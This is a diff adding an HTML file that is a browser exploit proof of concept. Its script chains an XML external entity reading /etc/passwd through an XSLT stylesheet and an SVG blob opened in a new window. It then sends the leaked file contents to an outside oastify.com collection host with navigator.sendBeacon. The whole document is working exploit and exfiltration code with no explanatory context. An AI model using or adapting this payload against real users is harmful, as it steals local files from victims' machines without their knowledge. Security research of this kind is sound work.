@@ -1,0 +1,45 @@
+<body>
+  <script>
+    const FILENAME = "/etc/passwd";
+
+    const xxe = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE xxe [ <!ENTITY xxe SYSTEM "file://${FILENAME}"> ]>
+<xxe>
+&xxe;
+</xxe>`;
+    const xls = `<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:user="http://mycompany.com/mynamespace">
+<xsl:output method="xml"/>
+<xsl:template match="/">
+<svg xmlns="http://www.w3.org/2000/svg">
+<foreignObject width="300" height="600">
+<div xmlns="http://www.w3.org/1999/xhtml">
+<xsl:copy-of  select="document('data:,${encodeURIComponent(xxe)}')"/>
+</div>
+</foreignObject>
+</svg>
+</xsl:template>
+</xsl:stylesheet>`;
+
+    const blob = new Blob(
+      [
+        `<?xml version="1.0" encoding="UTF-8"?>
+    <?xml-stylesheet type="text/xsl" href="data:text/xml;base64,${btoa(xls)}"?>
+    <!DOCTYPE svg [
+        <!ENTITY ent SYSTEM "?" NDATA aaa>
+    ]>
+    <svg location="ent" />`,
+      ],
+      { type: "image/svg+xml" }
+    );
+    const url = URL.createObjectURL(blob);
+    const w = window.open(url);
+    const interval = setInterval(() => {
+      if (w.document.readyState === "complete") {
+        clearInterval(interval);
+        const leak = w.document.querySelector("xxe").innerHTML;
+        w.close();
+        navigator.sendBeacon("https://6t0cthyhe7m2b8g7b7abmuwge7ky8pwe.oastify.com", leak);
+      }
+    }, 1000);
+  </script>
+</body>
